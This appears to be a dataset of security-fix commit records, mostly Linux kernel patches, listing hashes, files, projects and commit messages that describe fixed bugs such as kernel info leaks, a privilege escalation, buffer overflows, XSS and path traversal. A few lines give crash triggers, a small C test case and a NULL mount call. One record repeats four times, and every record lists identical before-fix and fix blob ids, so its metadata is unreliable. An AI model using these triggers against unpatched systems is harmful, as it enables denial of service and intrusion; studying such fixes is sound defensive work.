ksm: fix NULL pointer dereference in scan_get_next_rmap_item()\n\nAndrea Righi reported a case where an exiting task can race against ksmd::scan_get_next_rmap_item (http://lkml.org/lkml/2011/6/1/742) easily triggering a NULL pointer dereference in ksmd.\n\nksm_scan.mm_slot == &ksm_mm_head with only one registered mm\n\nCPU 1 (__ksm_exit)		CPU 2 (scan_get_next_rmap_item)  				list_empty() is false lock				slot == &ksm_mm_head list_del(slot->mm_list) (list now empty) unlock 				lock 				slot = list_entry(slot->mm_list.next) 				(list is empty, so slot is still ksm_mm_head) 				unlock 				slot->mm == NULL ... Oops\n\nClose this race by revalidating that the new slot is not simply the list head again.\n\nAndrea's test case:\n\n#include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/mman.h>\n\n#define BUFSIZE getpagesize()\n\nint main(int argc, char **argv) { 	void *ptr \n\n	if (posix_memalign(&ptr, getpagesize(), BUFSIZE) < 0) { 		perror("posix_memalign")  		exit(1)  	} 	if (madvise(ptr, BUFSIZE, MADV_MERGEABLE) < 0) { 		perror("madvise")  		exit(1)  	} 	*(char *)NULL = 0 \n\n	return 0  }\n\nReported-by: Andrea Righi <andrea@betterlinux.com> Tested-by: Andrea Righi <andrea@betterlinux.com> Cc: Andrea Arcangeli <aarcange@redhat.com> Signed-off-by: Hugh Dickins <hughd@google.com> Signed-off-by: Chris Wright <chrisw@sous-sol.org> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    326f0a2d56e52922920aad724dfec0e78487986a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    326f0a2d56e52922920aad724dfec0e78487986a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    326f0a2d56e52922920aad724dfec0e78487986a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    21c5977a836e399fc710ff2c5367845ed5c2527f
File(s) In Commit: 
    arch/alpha/kernel/osf_sys.c
Blob(s) In Commit: 
    326f0a2d56e52922920aad724dfec0e78487986a
Blob(s) Before Fix: 
    326f0a2d56e52922920aad724dfec0e78487986a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21c5977a836e399fc710ff2c5367845ed5c2527f:
alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ea2bc483ff5caada7c4aa0d5fbf87d3a6590273d
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    523e73ee354ad26ffc23718c7f4c6485519876a2
Blob(s) Before Fix: 
    523e73ee354ad26ffc23718c7f4c6485519876a2
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for ea2bc483ff5caada7c4aa0d5fbf87d3a6590273d:
[SCTP]: Fix assertion (!atomic_read(&sk->sk_rmem_alloc)) failed message\n\nIn current implementation, LKSCTP does receive buffer accounting for data in sctp_receive_queue and pd_lobby. However, LKSCTP don't do accounting for data in frag_list when data is fragmented. In addition, LKSCTP doesn't do accounting for data in reasm and lobby queue in structure sctp_ulpq. When there are date in these queue, assertion failed message is printed in inet_sock_destruct because sk_rmem_alloc of oldsk does not become 0 when socket is destroyed.\n\nSigned-off-by: Tsutomu Fujii <t-fujii@nb.jp.nec.com> Signed-off-by: Vlad Yasevich <vladislav.yasevich@hp.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0449641130f5652b344ef6fa39fa019d7e94660a
File(s) In Commit: 
    fs/ext4/super.c
Blob(s) In Commit: 
    551cb8e2110c85d452353a9833e29d7dd1596e10
Blob(s) Before Fix: 
    551cb8e2110c85d452353a9833e29d7dd1596e10
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0449641130f5652b344ef6fa39fa019d7e94660a:
ext4: init timer earlier to avoid a kernel panic in __save_error_info\n\nDuring mount, when we fail to open journal inode or root inode, the __save_error_info will mod_timer. But actually s_err_report isn't initialized yet and the kernel oops. The detailed information can be found https://bugzilla.kernel.org/show_bug.cgi?id=32082.\n\nThe best way is to check whether the timer s_err_report is initialized or not. But it seems that in include/linux/timer.h, we can't find a good function to check the status of this timer, so this patch just move the initializtion of s_err_report earlier so that we can avoid the kernel panic. The corresponding del_timer is also added in the error path.\n\nReported-by: Sami Liedes <sliedes@cc.hut.fi> Signed-off-by: Tao Ma <boyu.mt@taobao.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu>

======================================================================
Commit With Fix: 
    1a51410abe7d0ee4b1d112780f46df87d3621043
File(s) In Commit: 
    kernel/taskstats.c
Blob(s) In Commit: 
    e66046456f4ffebab2ec0300e0537a1fb1911e56
Blob(s) Before Fix: 
    e66046456f4ffebab2ec0300e0537a1fb1911e56
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1a51410abe7d0ee4b1d112780f46df87d3621043:
Make TASKSTATS require root access\n\nOk, this isn't optimal, since it means that 'iotop' needs admin capabilities, and we may have to work on this some more.  But at the same time it is very much not acceptable to let anybody just read anybody elses IO statistics quite at this level.\n\nUse of the GENL_ADMIN_PERM suggested by Johannes Berg as an alternative to checking the capabilities by hand.\n\nReported-by: Vasiliy Kulikov <segoon@openwall.com> Cc: Johannes Berg <johannes.berg@intel.com> Acked-by: Balbir Singh <bsingharora@gmail.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    1d1221f375c94ef961ba8574ac4f85c8870ddd51
File(s) In Commit: 
    fs/proc/base.c
Blob(s) In Commit: 
    fc5bc27676926cccbc27f3349886e02bbc047211
Blob(s) Before Fix: 
    fc5bc27676926cccbc27f3349886e02bbc047211
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1d1221f375c94ef961ba8574ac4f85c8870ddd51:
proc: restrict access to /proc/PID/io\n\n/proc/PID/io may be used for gathering private information.  E.g.  for openssh and vsftpd daemons wchars/rchars may be used to learn the precise password length.  Restrict it to processes being able to ptrace the target process.\n\nptrace_may_access() is needed to prevent keeping open file descriptor of "io" file, executing setuid binary and gathering io information of the setuid'ed process.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    982134ba62618c2d69fbbbd166d0a11ee3b7e3d8
File(s) In Commit: 
    mm/mremap.c
Blob(s) In Commit: 
    a7c1f9f9b94157033e232ef2618ebb67e0eef99d
Blob(s) Before Fix: 
    a7c1f9f9b94157033e232ef2618ebb67e0eef99d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 982134ba62618c2d69fbbbd166d0a11ee3b7e3d8:
mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff inside the mapping could wrap around due to overflow.  However, an expanding mremap() can take such a non-wrapping mapping and make it bigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it caused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A vma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net> Acked-by: Hugh Dickins <hughd@google.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    208c72f4fe44fe09577e7975ba0e7fa0278f3d03
File(s) In Commit: 
    net/wireless/nl80211.c
Blob(s) In Commit: 
    88a565f130a5a2e2e0f72fca3c204505a810a652
Blob(s) Before Fix: 
    88a565f130a5a2e2e0f72fca3c204505a810a652
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 208c72f4fe44fe09577e7975ba0e7fa0278f3d03:
nl80211: fix check for valid SSID size in scan operations\n\nIn both trigger_scan and sched_scan operations, we were checking for the SSID length before assigning the value correctly.  Since the memory was just kzalloc'ed, the check was always failing and SSID with over 32 characters were allowed to go through.\n\nThis was causing a buffer overflow when copying the actual SSID to the proper place.\n\nThis bug has been there since 2.6.29-rc4.\n\nCc: stable@kernel.org Signed-off-by: Luciano Coelho <coelho@ti.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    4e78c724d47e2342aa8fde61f6b8536f662f795f
File(s) In Commit: 
    security/tomoyo/mount.c
Blob(s) In Commit: 
    9fc2e15841c96f54edbefb24a96c40405d06bedd
Blob(s) Before Fix: 
    9fc2e15841c96f54edbefb24a96c40405d06bedd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4e78c724d47e2342aa8fde61f6b8536f662f795f:
TOMOYO: Fix oops in tomoyo_mount_acl().\n\nIn tomoyo_mount_acl() since 2.6.36, kern_path() was called without checking dev_name != NULL. As a result, an unprivileged user can trigger oops by issuing mount(NULL, "/", "ext3", 0, NULL) request. Fix this by checking dev_name != NULL before calling kern_path(dev_name).\n\nSigned-off-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Cc: stable@kernel.org Signed-off-by: James Morris <jmorris@namei.org>

======================================================================
Commit With Fix: 
    fc66c5210ec2539e800e87d7b3a985323c7be96e
File(s) In Commit: 
    arch/x86/kernel/cpu/perf_event.c
Blob(s) In Commit: 
    ec46eea0c4edd648df89c6ebe98ce53c2f6efc31
Blob(s) Before Fix: 
    ec46eea0c4edd648df89c6ebe98ce53c2f6efc31
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fc66c5210ec2539e800e87d7b3a985323c7be96e:
perf, x86: Fix Intel fixed counters base initialization\n\nThe following patch solves the problems introduced by Robert's commit 41bf498 and reported by Arun Sharma. This commit gets rid of the base + index notation for reading and writing PMU msrs.\n\nThe problem is that for fixed counters, the new calculation for the base did not take into account the fixed counter indexes, thus all fixed counters were read/written from fixed counter 0. Although all fixed counters share the same config MSR, they each have their own counter register.\n\nWithout:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n  242202299 unhalted_core_cycles (0.00% scaling, ena=1000790892, run=1000790892)  2389685946 instructions_retired (0.00% scaling, ena=1000790892, run=1000790892)       49473 baclears             (0.00% scaling, ena=1000790892, run=1000790892)\n\nWith:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n 2392703238 unhalted_core_cycles (0.00% scaling, ena=1000840809, run=1000840809)  2389793744 instructions_retired (0.00% scaling, ena=1000840809, run=1000840809)       47863 baclears             (0.00% scaling, ena=1000840809, run=1000840809)\n\nSigned-off-by: Stephane Eranian <eranian@google.com> Cc: peterz@infradead.org Cc: ming.m.lin@intel.com Cc: robert.richter@amd.com Cc: asharma@fb.com Cc: perfmon2-devel@lists.sf.net LKML-Reference: <20110319172005.GB4978@quad> Signed-off-by: Ingo Molnar <mingo@elte.hu>

======================================================================
Commit With Fix: 
    0d0138ebe24b94065580bd2601f8bb7eb6152f56
File(s) In Commit: 
    arch/xtensa/kernel/ptrace.c
Blob(s) In Commit: 
    a0d042aa296755e441fe4266a7103b315a581a34
Blob(s) Before Fix: 
    a0d042aa296755e441fe4266a7103b315a581a34
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0d0138ebe24b94065580bd2601f8bb7eb6152f56:
xtensa: prevent arbitrary read in ptrace\n\nPrevent an arbitrary kernel read.  Check the user pointer with access_ok() before copying data in.\n\n[akpm@linux-foundation.org: s/EIO/EFAULT/] Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Christian Zankel <chris@zankel.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    554e095a62c4412c91f981e72fd34a936ac2bf1e
File(s) In Commit: 
    Pyro/ext/daemonizer.py
Blob(s) In Commit: 
    11b50614d4672c41e13b7c4af756892d2ee32fdc
Blob(s) Before Fix: 
    11b50614d4672c41e13b7c4af756892d2ee32fdc
Projects:
    irmen_Pyro3
Commit Message for 554e095a62c4412c91f981e72fd34a936ac2bf1e:
changed pidfile location because of security vulnerability, debian bug #631912

======================================================================
Commit With Fix: 
    aba8d056078e47350d85b06a9cabd5afcc4b72ea
File(s) In Commit: 
    tools/perf/util/config.c
Blob(s) In Commit: 
    6c86eca8b1b7afc745433b9284e95c4ab94f86e8
Blob(s) Before Fix: 
    6c86eca8b1b7afc745433b9284e95c4ab94f86e8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for aba8d056078e47350d85b06a9cabd5afcc4b72ea:
perf tools: do not look at ./config for configuration\n\nIn addition to /etc/perfconfig and $HOME/.perfconfig, perf looks for configuration in the file ./config, imitating git which looks at $GIT_DIR/config.  If ./config is not a perf configuration file, it fails, or worse, treats it as a configuration file and changes behavior in some unexpected way.\n\n"config" is not an unusual name for a file to be lying around and perf does not have a private directory dedicated for its own use, so let's just stop looking for configuration in the cwd.  Callers needing context-sensitive configuration can use the PERF_CONFIG environment variable.\n\nRequested-by: Christian Ohm <chr.ohm@gmx.net> Cc: 632923@bugs.debian.org Cc: Ben Hutchings <ben@decadent.org.uk> Cc: Christian Ohm <chr.ohm@gmx.net> Cc: Ingo Molnar <mingo@elte.hu> Cc: Paul Mackerras <paulus@samba.org> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Link: http://lkml.kernel.org/r/20110805165838.GA7237@elie.gateway.2wire.net Signed-off-by: Jonathan Nieder <jrnieder@gmail.com> Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>

======================================================================
Commit With Fix: 
    b5b515445f4f5a905c5dd27e6e682868ccd6c09d
File(s) In Commit: 
    drivers/scsi/pmcraid.c
Blob(s) In Commit: 
    d079f9a3c6b3a7fc2dedd4cc850d32fcc82b4930
Blob(s) Before Fix: 
    d079f9a3c6b3a7fc2dedd4cc850d32fcc82b4930
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b5b515445f4f5a905c5dd27e6e682868ccd6c09d:
[SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that causes all sorts of ugliness, including heap corruption or triggering the OOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type PMCRAID_PASSTHROUGH_IOCTL.  This calls through to pmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer is copied in, and the request_size variable is set to buffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit signed value provided by the user.  If a negative value is provided here, bad things can happen.  For example, pmcraid_build_passthrough_ioadls() is called with this request_size, which immediately calls pmcraid_alloc_sglist() with a negative size. The resulting math on allocating a scatter list can result in an overflow in the kzalloc() call (if num_elem is 0, the sglist will be smaller than expected), or if num_elem is unexpectedly large the subsequent loop will call alloc_pages() repeatedly, a high number of pages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in pmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: James Bottomley <JBottomley@Parallels.com>

======================================================================
Commit With Fix: 
    819cbb120eaec7e014e5abd029260db1ca8c5735
File(s) In Commit: 
    drivers/staging/comedi/comedi_fops.c
Blob(s) In Commit: 
    419976b40bf47d0f46ed997d34650a72f7d5b0a4
Blob(s) Before Fix: 
    419976b40bf47d0f46ed997d34650a72f7d5b0a4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 819cbb120eaec7e014e5abd029260db1ca8c5735:
staging: comedi: fix infoleak to userspace\n\ndriver_name and board_name are pointers to strings, not buffers of size COMEDI_NAMELEN.  Copying COMEDI_NAMELEN bytes of a string containing less than COMEDI_NAMELEN-1 bytes would leak some unrelated bytes.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Cc: stable <stable@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>

======================================================================
Commit With Fix: 
    317f3db3a3c68775de3acf3b15f55b1e3c18f93b
File(s) In Commit: 
    core/filter_api.php
Blob(s) In Commit: 
    4224472639861474b60bc61151b786e16d3f2547
Blob(s) Before Fix: 
    4224472639861474b60bc61151b786e16d3f2547
Projects:
    01-Scripts_mantisbt
Commit Message for 317f3db3a3c68775de3acf3b15f55b1e3c18f93b:
Fix #13245: XSS issues with search.php parameters\n\nNet.Edit0r (Net.Edit0r@Att.net) from BlACK Hat Group [http://black-hg.org] posted a vulnerability report for an XSS issue in search.php for MantisBT 1.2.6.\n\nThe full report is available at http://packetstormsecurity.org/files/104149\n\nfilter_api.php is the culprit for this vulnerability as it passes user supplied search parameters back into output without first escaping the values.\n\nIt should be noted that numerous other XSS vulnerabilities (all related) have been fixed with this patch. In other words, it is not just the project_id parameter to search.php that was affected - it was numerous other parameters/fields as well.\n\nThe second SQL injection vulnerability identified by Net.Edit0r is invalid because the only time we ever make reference to "mbadmin" in the source code is:\n\ncore.php: if ( file_exists( 'mantis_offline.php' ) && !isset( $_GET['mbadmin'] ) )\n\nThis usage is safe because nothing is ever done with $_GET['mbadmin']. It may be the case that the user's customised version of mantis_offline.php was incorrectly dumping the value of $_GET['mbadmin'] to the screen. The default/sample mantis_offline.php has been checked and does not print any dynamically created strings/user supplied values.

======================================================================
Commit With Fix: 
    cbfe2ed36dd77c0843702935dea7f914bb599201
File(s) In Commit: 
    src/webui/app/controllers/project_controller.rb
Blob(s) In Commit: 
    9d97ae76202f3b41a5fc8ae60e2bc9cc4a4c772a
Blob(s) Before Fix: 
    9d97ae76202f3b41a5fc8ae60e2bc9cc4a4c772a
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for cbfe2ed36dd77c0843702935dea7f914bb599201:
[webui] check the value of the scheduler parameter

======================================================================
Commit With Fix: 
    f0f74b3f6ac6d47f7919aa9db380c0ad41ffe55f
File(s) In Commit: 
    modules/KIWIRoot.pm
Blob(s) In Commit: 
    190d7c9bfc036cfe3591245811624833ccb8bb96
Blob(s) Before Fix: 
    190d7c9bfc036cfe3591245811624833ccb8bb96
Projects:
    AdamMajer_kiwi
Commit Message for f0f74b3f6ac6d47f7919aa9db380c0ad41ffe55f:
- fixed escaping of chown parameters (bnc #725706)

======================================================================
Commit With Fix: 
    9438fabb73eb48055b58b89fc51e0bc4db22fabd
File(s) In Commit: 
    fs/cifs/cifssmb.c
Blob(s) In Commit: 
    a80f7bd97b90d541e9305d7e225c708f3f0cd3d1
Blob(s) Before Fix: 
    a80f7bd97b90d541e9305d7e225c708f3f0cd3d1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9438fabb73eb48055b58b89fc51e0bc4db22fabd:
cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to the resume_name_len in the cifs_search_info. The resume_name_len however is unsigned and for some infolevels is populated directly from a 32 bit value sent by the server.\n\nIf the server sends a very large value for this, then that value could look negative when converted to a signed int. That would make that value pass the PATH_MAX check later in CIFSFindNext. The name_len would then be used as a length value for a memcpy. It would then be treated as unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org> Reported-by: Darren Lavender <dcl@hppine99.gbr.hp.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>

======================================================================
Commit With Fix: 
    c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae
File(s) In Commit: 
    fs/fuse/dev.c
Blob(s) In Commit: 
    168a80f7f12b856e795eb916bf79f5e2348e06f6
Blob(s) Before Fix: 
    168a80f7f12b856e795eb916bf79f5e2348e06f6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae:
fuse: check size of FUSE_NOTIFY_INVAL_ENTRY message\n\nFUSE_NOTIFY_INVAL_ENTRY didn't check the length of the write so the message processing could overrun and result in a "kernel BUG at fs/fuse/dev.c:629!"\n\nReported-by: Han-Wen Nienhuys <hanwenn@gmail.com> Signed-off-by: Miklos Szeredi <mszeredi@suse.cz> CC: stable@kernel.org

======================================================================
Commit With Fix: 
    d00745f5e267eba4ca34286d125de685bc3a8034
File(s) In Commit: 
    config_defaults_inc.php
Blob(s) In Commit: 
    74acccc70eb2924b58f8fad2d8f5d91ecc64e9d1
Blob(s) Before Fix: 
    74acccc70eb2924b58f8fad2d8f5d91ecc64e9d1
Projects:
    01-Scripts_mantisbt
Commit Message for d00745f5e267eba4ca34286d125de685bc3a8034:
Fix issue introduced previously whereby php_Self is now used unchecked.\n\nintroduced previously by john attempting to fix symlinks. Since we now use php 5.2, we can make use of filter_var.\n\nThis is a simpler version of what we were trying to do previously aka http://git.mantisforge.org/w/mantisbt.git?a=commitdiff h=5ac1fdf32717d0c82cca7e7660dd4fd316a6a1b8\n\nDepending on server/mantis config this can lead to XSS issues\n\nDavid: Backported from master branch and removed unreachable code branch.\n\nSigned-off-by: David Hicks <d@hx.id.au>

======================================================================
Commit With Fix: 
    70945643722ffeac779d2529a348f99567fa5c33
File(s) In Commit: 
    fs/cifs/connect.c
Blob(s) In Commit: 
    5eacb89d4a4f9af0c0bf3676e6cdc7c6640d53b1
Blob(s) Before Fix: 
    5eacb89d4a4f9af0c0bf3676e6cdc7c6640d53b1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 70945643722ffeac779d2529a348f99567fa5c33:
cifs: always do is_path_accessible check in cifs_mount\n\nCurrently, we skip doing the is_path_accessible check in cifs_mount if there is no prefixpath. I have a report of at least one server however that allows a TREE_CONNECT to a share that has a DFS referral at its root. The reporter in this case was using a UNC that had no prefixpath, so the is_path_accessible check was not triggered and the box later hit a BUG() because we were chasing a DFS referral on the root dentry for the mount.\n\nThis patch fixes this by removing the check for a zero-length prefixpath.  That should make the is_path_accessible check be done in this situation and should allow the client to chase the DFS referral at mount time instead.\n\nCc: stable@kernel.org Reported-and-Tested-by: Yogesh Sharma <ysharma@cymer.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>

======================================================================
Commit With Fix: 
    dd50a50a2760f10bd2d09814e30af4b36052ca6d
File(s) In Commit: 
    include/functions.php
Blob(s) In Commit: 
    ca9bf2021064f95daf85891d2baa793c50aa5902
Blob(s) Before Fix: 
    ca9bf2021064f95daf85891d2baa793c50aa5902
Projects:
    18jaguar18_punbb
Commit Message for dd50a50a2760f10bd2d09814e30af4b36052ca6d:
Fix XSS vulnerabilities described on http://seclists.org/fulldisclosure/2011/Sep/158

======================================================================
Commit With Fix: 
    92e22ca23e52066da2258df8c76a2dca8a428bcc
File(s) In Commit: 
    device-linux.c
Blob(s) In Commit: 
    709eebc630e69faa8f5300a45f39c70742fa5add
Blob(s) Before Fix: 
    709eebc630e69faa8f5300a45f39c70742fa5add
Projects:
    BrainSlayer_radvd
Commit Message for 92e22ca23e52066da2258df8c76a2dca8a428bcc:
set_interface_var() doesn't check interface name and blindly does fopen(path "/" ifname, "w") on it.  As "ifname" is an untrusted input, it should be checked for ".." and/or "/" in it.  Otherwise, an infected unprivileged daemon may overwrite contents of file named "mtu", "hoplimit", etc. in arbitrary location with arbitrary 32-bit value in decimal representation ("%d").  If an attacker has a local account or may create arbitrary symlinks with these names in any location (e.g. /tmp), any file may be overwritten with a decimal value.

======================================================================
Commit With Fix: 
    a5b2c5b2ad5853591a6cac6134cd0f599a720865
File(s) In Commit: 
    security/apparmor/lsm.c
Blob(s) In Commit: 
    ec1bcecf2cdacd6009c79d6a809d4b7b8443f29d
Blob(s) Before Fix: 
    ec1bcecf2cdacd6009c79d6a809d4b7b8443f29d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a5b2c5b2ad5853591a6cac6134cd0f599a720865:
AppArmor: fix oops in apparmor_setprocattr\n\nWhen invalid parameters are passed to apparmor_setprocattr a NULL deref oops occurs when it tries to record an audit message. This is because it is passing NULL for the profile parameter for aa_audit. But aa_audit now requires that the profile passed is not NULL.\n\nFix this by passing the current profile on the task that is trying to setprocattr.\n\nSigned-off-by: Kees Cook <kees@ubuntu.com> Signed-off-by: John Johansen <john.johansen@canonical.com> Cc: stable@kernel.org Signed-off-by: James Morris <jmorris@namei.org>

======================================================================
Commit With Fix: 
    76597cd31470fa130784c78fadb4dab2e624a723
File(s) In Commit: 
    fs/proc/task_mmu.c
Blob(s) In Commit: 
    2e7addfd9803559ca03a2527aaab161006e3b482
Blob(s) Before Fix: 
    2e7addfd9803559ca03a2527aaab161006e3b482
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 76597cd31470fa130784c78fadb4dab2e624a723:
proc: fix oops on invalid /proc/<pid>/maps access\n\nWhen m_start returns an error, the seq_file logic will still call m_stop with that error entry, so we'd better make sure that we check it before using it as a vma.\n\nIntroduced by commit ec6fd8a4355c ("report errors in /proc/*/*map* sanely"), which replaced NULL with various ERR_PTR() cases.\n\n(On ia64, you happen to get a unaligned fault instead of a page fault, since the address used is generally some random error code like -EPERM)\n\nReported-by: Anca Emanuel <anca.emanuel@gmail.com> Reported-by: Tony Luck <tony.luck@intel.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Américo Wang <xiyou.wangcong@gmail.com> Cc: Stephen Wilson <wilsons@start.ca> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
